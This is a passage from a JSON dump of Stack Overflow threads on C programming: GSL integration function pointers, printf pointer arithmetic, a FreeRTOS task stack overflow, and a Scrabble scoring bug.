1498050592, "post_id": 44676920, "comment_id": 76338263, "body": "You&#39;ll have to edit the post and fix the indention if you expect others to read this question."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 8125227, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YGECHCETkAI/AAAAAAAAAAI/AAAAAAAAAS8/5wL3s3lL5IA/photo.jpg?sz=128", "display_name": "Ramesh Kumar", "link": "https://stackoverflow.com/users/8125227/ramesh-kumar"}, "edited": false, "score": 0, "creation_date": 1498116706, "post_id": 44677340, "comment_id": 76368957, "body": "Thanks for your kind response sir,  In my case I need to declare a structure  in my code because gsl params pointer (in gsl_integration.h file) can access only one member either &quot;t&quot; or &quot;k&quot; at a time. That&#39;s why I am using struct har type In H1 else its showing an another error ( returning type \u2018double\u2019 but \u2018struct har\u2019 was expected).  So plz help me out how should I declare these data type. Thanks for your valuable time and observation."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 1, "user_id": 8125227, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YGECHCETkAI/AAAAAAAAAAI/AAAAAAAAAS8/5wL3s3lL5IA/photo.jpg?sz=128", "display_name": "Ramesh Kumar", "link": "https://stackoverflow.com/users/8125227/ramesh-kumar"}, "edited": false, "score": 0, "creation_date": 1498151111, "post_id": 44677340, "comment_id": 76393872, "body": "@RameshKumar See my edit.  You need to change <code>H1</code> to match the function pointer."}, {"owner": {"reputation": 1, "user_id": 8125227, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YGECHCETkAI/AAAAAAAAAAI/AAAAAAAAAS8/5wL3s3lL5IA/photo.jpg?sz=128", "display_name": "Ramesh Kumar", "link": "https://stackoverflow.com/users/8125227/ramesh-kumar"}, "edited": false, "score": 0, "creation_date": 1498214366, "post_id": 44677340, "comment_id": 76420789, "body": "Thanks a lot Sir,  Now my code is running very well."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 1, "user_id": 8125227, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YGECHCETkAI/AAAAAAAAAAI/AAAAAAAAAS8/5wL3s3lL5IA/photo.jpg?sz=128", "display_name": "Ramesh Kumar", "link": "https://stackoverflow.com/users/8125227/ramesh-kumar"}, "edited": false, "score": 0, "creation_date": 1498216064, "post_id": 44677340, "comment_id": 76421905, "body": "@RameshKumar Glad I could help.  Feel free to <a href=\"https://stackoverflow.com/help/accepted-answer\">accept this answer</a> if you found it useful."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 1, "last_activity_date": 1498151077, "last_edit_date": 1498151077, "creation_date": 1498051188, "answer_id": 44677340, "question_id": 44676920, "link": "https://stackoverflow.com/questions/44676920/warning-assignment-from-incompatible-pointer-type-wincompatible-pointer-types/44677340#44677340", "title": "warning: assignment from incompatible pointer type [-Wincompatible-pointer-types] qt1.function = &amp;H1", "body": "<p>The field <code>qt1.function</code> has type <code>double (*)(double, void *)</code>.  The function <code>H1</code> which you attempt to assign to this field has type <code>struct har (*)( void *, float, int)</code>.  </p>\n\n<p>These types are incompatible as the number of arguments, the types of the arguments, and the return type are all different.  As it is right now, you have two parameters called <code>p</code> and <code>q</code> that are never being used.  Also, the <code>struct har</code> you construct as a return value doesn't even set all the fields, just the first one, so why are you even returning a struct?</p>\n\n<p>In order for <code>H1</code> to work with <code>gsl_function</code>, is <strong>must</strong> accept a <code>double</code> and a <code>void *</code> and return a <code>double</code>.  The <code>x</code> value corresponds to the <code>double</code> that is passed in, so you don't need that in your struct.  Since you're also only building a single value to return, that's what you return.</p>\n\n<pre><code>struct har{\n    double t;\n    double k;\n};\n\ndouble H1( double x, void  *params)\n{\n    struct har *p_params = params;   // no need to cast to/from void *\n\n    float mu=2;\n    double t = p_params-&gt;t;\n    double k = p_params-&gt;k;\n\n    return  x*cos(t*x)/(pow((mu*t*k),2)+pow(x,2));\n}\n</code></pre>\n\n<p>Also, you're not setting the values of <code>qt1</code> properly:</p>\n\n<p>qt1.params = &amp;p_params;</p>\n\n<p>Since <code>p_params</code> is a <code>struct har *</code>, its address is a <code>struct har **</code>.  Your function however is expecting a <code>struct har *</code> to be passed in.  So change this to the address of the struct, not the address of a pointer pointing to it:</p>\n\n<pre><code>qt1.params = &amp;item;\n</code></pre>\n\n<p>You also have a mismatch when you set <code>qt.params</code>.  You're giving it a <code>float *</code>, but your function <code>H</code> is expecting a <code>double *</code>.  Just change the type of <code>t</code> to match:</p>\n\n<pre><code>double t = 4.14937*(m-1);\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8125227, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YGECHCETkAI/AAAAAAAAAAI/AAAAAAAAAS8/5wL3s3lL5IA/photo.jpg?sz=128", "display_name": "Ramesh Kumar", "link": "https://stackoverflow.com/users/8125227/ramesh-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1695, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1498151077, "creation_date": 1498050058, "question_id": 44676920, "link": "https://stackoverflow.com/questions/44676920/warning-assignment-from-incompatible-pointer-type-wincompatible-pointer-types", "title": "warning: assignment from incompatible pointer type [-Wincompatible-pointer-types] qt1.function = &amp;H1", "body": "<p>I doing integration of a complex function using gsl library in C programming language. In this code I had to declare two variables using pointer that I have done successfully. But I am facing a problem when I pass these variables in main function.</p>\n\n<p>Please help me out.</p>\n\n<p>My code is being written here:</p>\n\n<pre><code>struct har{\n\ndouble t;\ndouble k;\ndouble x;\n};\n\n#include\"str.h\"\nstruct har H1( void  * params, float q , int p )\n\n    {\n\n    struct har  *p_params = (void *)params;\n\n\n    float  mu=2;\n    double x =p_params -&gt;x ;\n    double t = p_params -&gt; t;\n    double  k = p_params -&gt; k;\n    //printf(\"%d\",k);\n    struct har  H1 =  {x*cos(t*x)/(pow((mu*t*k),2)+pow(x,2))};\n    return H1;\n    }\n\n\n double H (double x,void * params )\n{\ndouble e;\ndouble t = *(double *) params;\n//printf(\"%f\\n\",t);\n//struct har t1,z;\n//double t = z.params -&gt;t1;\ndouble H  = (pow(e,-x)/x) ;//I(x,&amp;t)*(sin(x*t));  \nreturn H;\n}\n\n\n#include&lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;gsl/gsl_integration.h&gt;\n#include\"H.h\"\n#include\"H1.h\"\n\nint\nmain (void)\n{\n  gsl_integration_workspace * w\n    = gsl_integration_workspace_alloc (10000);\n\n  struct har t,k;\n\n  double x, qtr, qbartr, qdottr, qddotr,q7r, qatr, qbtr, qt1r, error;\n  double expected = -4.0;\n  double a1 = 1e-14;\n  double a= 150;//150;\n  double pi = 3.141;\n  double b = 1.05263;\n  double mu = (2*pi)/b;\n  double q0=0;\n  double p0=6.5;\n  double om=7.07;\n  double tau=0.141;\n  double gamma = 0.180;\n\nfor(int m=2; m&lt;4; m++)\n{\n\n\n float  t = 4.14937*(m-1);\n\n\n gsl_function qt;\n qt.function = &amp;H;\n qt.params =&amp;t;\n gsl_integration_qags (&amp;qt, a1, a, 0,1e-7, 10000, w, &amp;qtr, &amp;error);\n// printf (\"qtresult = % .18f\\n\\n\", qtr);\n\n for(int k=1; k&lt;=2; k++)\n    {\n      {\nstruct har item = {x,t,k};\nstruct har *p_params = &amp;item;\n\n\n       double  gama=gamma/((mu*k*tau)+1);\n//      printf(\"gama = % .18f\\n\", gama);\n\n       gsl_function qt1;\n\n       qt1.function = &amp;H1;\n       qt1.params = &amp;p_params;\n    // qt1.params = &amp;k;\n       gsl_integration_qags (&amp;qt1, a1, a, 0,1e-7, 10000, w, &amp;qt1r, &amp;error);\n      printf(\"qt1result= % .18f\\n\", qt1r);\n\n\n     }\n\n}\n\n\n  gsl_integration_workspace_free (w);\n\n  return 0;\n}\n</code></pre>\n\n<p>In above code I had four file by namely code.c, str.h, H1.h and H.h. Where H1 and H contains two user defined functions and str is a file for structure and code.c is my main to compile.</p>\n\n<p>Thanks for your time and observation.</p>\n\n<p>Regards </p>\n\n<p>Ramesh  </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 1, "creation_date": 1498046332, "post_id": 44675469, "comment_id": 76334867, "body": "pointer artithmetic. shifts string by 9 bytes."}, {"owner": {"reputation": 539, "user_id": 2805824, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/tBgwo.gif?s=128&g=1", "display_name": "Gaurav Pathak", "link": "https://stackoverflow.com/users/2805824/gaurav-pathak"}, "edited": false, "score": 1, "creation_date": 1498046451, "post_id": 44675469, "comment_id": 76334965, "body": "<code>str+9</code> shifts the pointer to the 9th character of the string. If you do <code>str+0</code> then complete string <i>CQUESTIONBANK</i> gets printed. If you do <code>str+1</code> only <i>QUESTIONBANK</i> gets printed."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498047971, "post_id": 44675469, "comment_id": 76336117, "body": "Uninstall Turbo C and then get a decent book about C."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1498051271, "post_id": 44675469, "comment_id": 76338784, "body": "@Lundin <code>clrscr();</code> gave him away right ? :)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498057157, "post_id": 44675469, "comment_id": 76343606, "body": "...and the <code>void main()</code>"}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 1, "last_activity_date": 1498046478, "creation_date": 1498046478, "answer_id": 44675541, "question_id": 44675469, "link": "https://stackoverflow.com/questions/44675469/how-to-understand-the-statement-of-printfstr9/44675541#44675541", "title": "How to understand the statement of printf(str+9)?", "body": "<p>A <em>string</em> in C is defined as a sequence of <code>char</code> terminated by a <code>'\\0'</code>. A string isn't a type in C. So, functions handling strings accept a pointer to the beginning of the string (a pointer to <code>char</code>).</p>\n\n<p>You can do arithmetics on pointers. <code>+ x</code> means increase the pointer by <code>x</code> elements pointed to. So, <code>str+9</code> in your example points to the character <code>B</code>. This pointer is passed as the start of the string to <code>printf()</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 556, "user_id": 7995937, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh3.googleusercontent.com/-YDrm9Xrcs_Y/AAAAAAAAAAI/AAAAAAAABEI/PyfG2zlzs7Q/photo.jpg?sz=128", "display_name": "Arjun Balgovind", "link": "https://stackoverflow.com/users/7995937/arjun-balgovind"}, "is_accepted": false, "score": 0, "last_activity_date": 1498046493, "creation_date": 1498046493, "answer_id": 44675545, "question_id": 44675469, "link": "https://stackoverflow.com/questions/44675469/how-to-understand-the-statement-of-printfstr9/44675545#44675545", "title": "How to understand the statement of printf(str+9)?", "body": "<p>str gives the base address of the pointer to the string.\nSo normally if you just use <code>printf(str)</code> it should output CQUESTIONBANK.\nBut in this case you are printing str+9, ie. <code>printf(str+9)</code>, so in this case it refers to string starting from the 9th index. In this case the 9th index is B,(C follows 0 indexing), so the string printed is BANK.</p>\n\n<p>printf will always print the string from the passed pointer as starting position till the end of the string, which is stored as <code>'\\0'</code> known as Null Character. If you try <code>printf(str[13])</code>, it should print <code>'\\0'</code></p>\n"}, {"tags": [], "owner": {"reputation": 10050, "user_id": 3512538, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/6Om7A.png?s=128&g=1", "display_name": "CIsForCookies", "link": "https://stackoverflow.com/users/3512538/cisforcookies"}, "is_accepted": false, "score": 0, "last_activity_date": 1498047098, "last_edit_date": 1498047098, "creation_date": 1498046723, "answer_id": 44675632, "question_id": 44675469, "link": "https://stackoverflow.com/questions/44675469/how-to-understand-the-statement-of-printfstr9/44675632#44675632", "title": "How to understand the statement of printf(str+9)?", "body": "<p><code>str</code> points to a location (address). You can move in any direction over these addresses using <code>+</code> and <code>-</code>. So, if <code>str</code> points to some address, say <code>0x1002</code>, then <code>str+1</code> points to <code>0x1003</code> and <code>str-1</code> points to <code>0x1001</code>. (assuming <code>str</code> is <code>char*</code>. With other pointer types you move in bigger steps - <code>sizeof(*str)</code>)</p>\n\n<p>In your example - <code>str</code> points to an address that holds <code>CQUESTIONBANK</code> so if you move the pointer 9 steps forward, you move past <code>C,Q,U,E,S,T,I,O,N</code> and you now point to <code>BANK</code>. Now using <code>printf</code> will print from that location resulting in <code>BANK</code></p>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 8193246, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e051e628c6b7dc9f27734da792e1cc6d?s=128&d=identicon&r=PG&f=1", "display_name": "Reeshma", "link": "https://stackoverflow.com/users/8193246/reeshma"}, "edited": false, "score": 1, "creation_date": 1498048481, "post_id": 44675723, "comment_id": 76336529, "body": "Thank you all...who made me clear about this...now i understood"}], "tags": [], "owner": {"reputation": 579, "user_id": 4371177, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0deb2a7b0ef3f1264fab392cb1584f72?s=128&d=identicon&r=PG&f=1", "display_name": "Mazhar", "link": "https://stackoverflow.com/users/4371177/mazhar"}, "is_accepted": false, "score": 0, "last_activity_date": 1498046959, "creation_date": 1498046959, "answer_id": 44675723, "question_id": 44675469, "link": "https://stackoverflow.com/questions/44675469/how-to-understand-the-statement-of-printfstr9/44675723#44675723", "title": "How to understand the statement of printf(str+9)?", "body": "<pre><code>#include&lt;stdio.h&gt;\n\nvoid main()\n{\nchar *str=\"CQUESTIONBANK\";\n\n/* clrscr() function will clear the console.*/\nclrscr();\n\n/* printf() function, outputs the data. The name of the string, in your case\n   it is 'str' always points first element of the string which is 'C'. Adding 9 will\n   'str' point to 'B' character in the string. That's why printf is printing from B on wards.\n   Similarly adding 10 to 'str' will print from 'A' and so on.*/\n\nprintf(str+9);\n\n/* getch() function waits for you to enter any character.*/\ngetch();\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8193246, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e051e628c6b7dc9f27734da792e1cc6d?s=128&d=identicon&r=PG&f=1", "display_name": "Reeshma", "link": "https://stackoverflow.com/users/8193246/reeshma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 358, "favorite_count": 0, "closed_date": 1498047990, "answer_count": 4, "score": -1, "last_activity_date": 1498050705, "creation_date": 1498046289, "last_edit_date": 1498050705, "question_id": 44675469, "link": "https://stackoverflow.com/questions/44675469/how-to-understand-the-statement-of-printfstr9", "closed_reason": "Duplicate", "title": "How to understand the statement of printf(str+9)?", "body": "<pre><code>#include&lt;stdio.h&gt;\n\nvoid main()\n{\nchar *str=\"CQUESTIONBANK\";\nclrscr();\nprintf(str+9);\ngetch();\n}\n</code></pre>\n\n<p>The output is BANK. what the printf statement does. Can anyone please explain that?</p>\n"}, {"tags": ["c", "stack", "embedded", "freertos"], "comments": [{"owner": {"reputation": 24042, "user_id": 1356107, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/qXxvn.png?s=128&g=1", "display_name": "Tschallacka", "link": "https://stackoverflow.com/users/1356107/tschallacka"}, "edited": false, "score": 2, "creation_date": 1498046383, "post_id": 44675300, "comment_id": 76334904, "body": "show your code. <a href=\"https://stackoverflow.com/help/how-to-ask\">stackoverflow.com/help/how-to-ask</a>"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5906248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c7fac1f0e87621215cefab40da7b649?s=128&d=identicon&r=PG&f=1", "display_name": "Harry Wadkar", "link": "https://stackoverflow.com/users/5906248/harry-wadkar"}, "edited": false, "score": 0, "creation_date": 1498109214, "post_id": 44684916, "comment_id": 76364935, "body": "The application is kind of safety application. And as for ADC sampling in PIC i&#39;m polling DONE bit, so there is slight possibility of controller being stuck at polling. Which is why i have implemented different tasks. What if i just create and delete the task when ever needed???Will it free the memory occupied by the task so that i can assign that memory to another task????Thank you"}, {"owner": {"reputation": 1473, "user_id": 6517894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0511b1daef16fed51233f70c4370dafc?s=128&d=identicon&r=PG&f=1", "display_name": "Realtime Rik", "link": "https://stackoverflow.com/users/6517894/realtime-rik"}, "edited": false, "score": 0, "creation_date": 1498115207, "post_id": 44684916, "comment_id": 76368063, "body": "Dynamically allocating memory in a &quot;safety application&quot; is not recommended! As Richard stated it is probably an interrupt occuring and pushing the stack over the limit or there is a path through the task code that uses more stack than usual. In any case the simple solution is to increase the stack size (of each ADC task). The minimal stack size is probably not big enough for your requirements. That said if you could do this all in one task then you could have a bigger stack and still use considerably less memory (and better performance)"}, {"owner": {"reputation": 1, "user_id": 5906248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c7fac1f0e87621215cefab40da7b649?s=128&d=identicon&r=PG&f=1", "display_name": "Harry Wadkar", "link": "https://stackoverflow.com/users/5906248/harry-wadkar"}, "edited": false, "score": 0, "creation_date": 1498120419, "post_id": 44684916, "comment_id": 76371514, "body": "Thanks, i checked some time ago that which task is getting into hook() by printing pcTaskName on lcd and it shows &quot;IDL&quot;, so now i bit confused that how ideal task uses that much stack(correct me if am wrong)??? Besides that my heap is 5120 so in that how many tasks i can create with how much minimum stack size???? and one more every time when I suspend a task and resumes another task will that occupy new memory every time?????Thank you."}], "tags": [], "owner": {"reputation": 2658, "user_id": 3887835, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84c6f11a2a2ff629a3684515f6769637?s=128&d=identicon&r=PG", "display_name": "Richard", "link": "https://stackoverflow.com/users/3887835/richard"}, "is_accepted": false, "score": 3, "last_activity_date": 1498073899, "creation_date": 1498073899, "answer_id": 44684916, "question_id": 44675300, "link": "https://stackoverflow.com/questions/44675300/stack-overflow-in-freertos/44684916#44684916", "title": "stack overflow in freertos", "body": "<p>It would seem wasteful to create a task per ADC input.  What else are the tasks doing other than reading the ADC?</p>\n\n<p>I would guess your task is very close to the edge of its stack and at some point you happen to get an interrupt just when you are at the maximum stack depth and that causes an overflow.  You can make periodic calls to <a href=\"http://www.freertos.org/uxTaskGetStackHighWaterMark.html\" rel=\"nofollow noreferrer\">uxTaskGetStackHighWaterMark()</a> to determine how close to the end of the stack you have reached.</p>\n"}], "owner": {"reputation": 1, "user_id": 5906248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c7fac1f0e87621215cefab40da7b649?s=128&d=identicon&r=PG&f=1", "display_name": "Harry Wadkar", "link": "https://stackoverflow.com/users/5906248/harry-wadkar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 754, "favorite_count": 1, "answer_count": 1, "score": -1, "last_activity_date": 1498073899, "creation_date": 1498045881, "last_edit_date": 1498072719, "question_id": 44675300, "link": "https://stackoverflow.com/questions/44675300/stack-overflow-in-freertos", "title": "stack overflow in freertos", "body": "<p>I'm reading some data on ADC channels on dsPIC30F6014A.\nFor that I have implemented a separate task for each ADC(say 7 channels-7 tasks).<br>\nI have created all the tasks at the start only, My heap size is 5120, I'm using heap_4.c and I have allocated stack for each task is <code>configMINIMAL_Stack</code>(i.e. 115).<br>\nThese tasks are running continuously and periodically(just <code>vTaskSuspend()</code> and <code>vTaskResume()</code> is what I'm doing)<br>\nAt start all tasks are working fine but after some time <code>vApplicationStackOverflowHook()</code> occurs, i.e. stack gets overflowed.</p>\n\n<p>Is there any possibility of wrong handling of memory?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 328, "user_id": 8010390, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/46c400c051659a29e3a5497877b9e5d3?s=128&d=identicon&r=PG&f=1", "display_name": "surjit", "link": "https://stackoverflow.com/users/8010390/surjit"}, "edited": false, "score": 0, "creation_date": 1498046044, "post_id": 44675169, "comment_id": 76334632, "body": "What is a Scrabble word?? You said Scrabble word, but you are giving a character as input.. plz clarify"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1498046094, "post_id": 44675169, "comment_id": 76334675, "body": "Please learn about <i>indentation</i>. Also consider using empty lines to divide the code into blocks. It will make the code easier to read, understand and maintain."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1498046166, "post_id": 44675169, "comment_id": 76334736, "body": "Furthermore, the <a href=\"http://en.cppreference.com/w/c/io/getchar\" rel=\"nofollow noreferrer\"><code>getchar</code></a> returns an <code>int</code>. It&#39;s important when you check for errors or end-of-file (when <code>getchar</code> returns <code>EOF</code>). Something you really should check for."}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1498047234, "post_id": 44675169, "comment_id": 76335534, "body": "&quot;I&#39;m not getting the correct answer&quot; isn&#39;t helpful."}, {"owner": {"reputation": 6958, "user_id": 6893866, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/aefa0df51c67447c39a26252720cea2e?s=128&d=identicon&r=PG&f=1", "display_name": "Tezra", "link": "https://stackoverflow.com/users/6893866/tezra"}, "edited": false, "score": 0, "creation_date": 1498049435, "post_id": 44675169, "comment_id": 76337259, "body": "What are you inputting? What are you getting out? (What is the expected output? Is case suppose to be sensitive? (This only allows uppercase words)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498056988, "post_id": 44675169, "comment_id": 76343453, "body": "Use the right type as commented, <code>char ch;</code> ==&gt; <code>int ch;</code> and another important technique is to <i>read the man page</i> of every function you use."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1498063653, "post_id": 44675169, "comment_id": 76347978, "body": "Welcome to Stack Overflow! It is difficult to offer solutions when the problem statement is simply, &quot;it doesn&#39;t work&quot;.  Please <a href=\"https://stackoverflow.com/posts/44675169/edit\">edit</a> your question to give a more complete description of what you expected to happen and how that differs from the actual results.  See <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a> for hints on what makes a good explanation."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498046467, "post_id": 44675232, "comment_id": 76334977, "body": "Thanks this seems to have solved my problem.Except another one crept up. It always shows 0 if i input alphabets in lower case. If i input using caps lock the answer is right. Guess some problem in my &#39;toupper()&#39; ? Thanks again"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498046617, "post_id": 44675232, "comment_id": 76335062, "body": "@NayanT The <a href=\"http://en.cppreference.com/w/c/string/byte/toupper\" rel=\"nofollow noreferrer\"><code>toupper</code></a> function <i>returns</i> the new character. It can&#39;t modify it in place."}, {"owner": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498047103, "post_id": 44675232, "comment_id": 76335437, "body": "Ah Thanks again. Will be sure to practicing on my indentation too. ;D"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1498046021, "last_edit_date": 1498046021, "creation_date": 1498045712, "answer_id": 44675232, "question_id": 44675169, "link": "https://stackoverflow.com/questions/44675169/finding-points-of-a-scrabble-word/44675232#44675232", "title": "Finding points of a scrabble word", "body": "<p>An expression like <code>ch =='D'||'G'</code> is equal to <code>(ch == 'D')||'G'</code>.</p>\n\n<p>In other words you first perform the sub-expression <code>ch == 'D'</code>. Then you do a logical or using <code>'G'</code>. The result will <em>always</em> be true since <code>'G'</code> is non-zero, and everything non-zero is true in C.</p>\n\n<p>You want <code>ch == 'D' || ch == 'G'</code> instead, to check if <code>ch</code> is equal to <code>'D'</code> or if <code>ch</code> is equal to <code>'G'</code>.</p>\n\n<p>This is very basic and every <a href=\"http://stackoverflow.com/questions/562303/the-definitive-c-book-guide-and-list\">good beginners book</a> would have told you so.</p>\n\n<hr>\n\n<p>In the specific case of the code you show, the very first check will <em>always</em> be true because of this, and you will not check any other cases.</p>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498047038, "post_id": 44675428, "comment_id": 76335387, "body": "Hello thanks . Yes some problem with my toupper. Could you please explain a bit about the if block containing break.is it checking for error.How? Thanks again."}, {"owner": {"reputation": 1, "user_id": 8193823, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f08b949e6d1fc7cabcf2ca2d1097c86?s=128&d=identicon&r=PG&f=1", "display_name": "Nayan T", "link": "https://stackoverflow.com/users/8193823/nayan-t"}, "edited": false, "score": 0, "creation_date": 1498047147, "post_id": 44675428, "comment_id": 76335467, "body": "Hello thanks . Yes some problem with my toupper. Could you please explain a bit about the if block containing break.is it checking for error.How? Thanks again."}, {"owner": {"reputation": 938, "user_id": 5502325, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pXFxy.jpg?s=128&g=1", "display_name": "Silveris", "link": "https://stackoverflow.com/users/5502325/silveris"}, "edited": false, "score": 0, "creation_date": 1498048028, "post_id": 44675428, "comment_id": 76336155, "body": "As Drumz said, <code>toupper()</code> will return <code>&#39;c&#39;</code> if it fails. So you have to check if <code>ch</code> is equal to <code>&#39;c&#39;</code> to see if there was an error."}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1498050401, "post_id": 44675428, "comment_id": 76338098, "body": "@Drumz You have 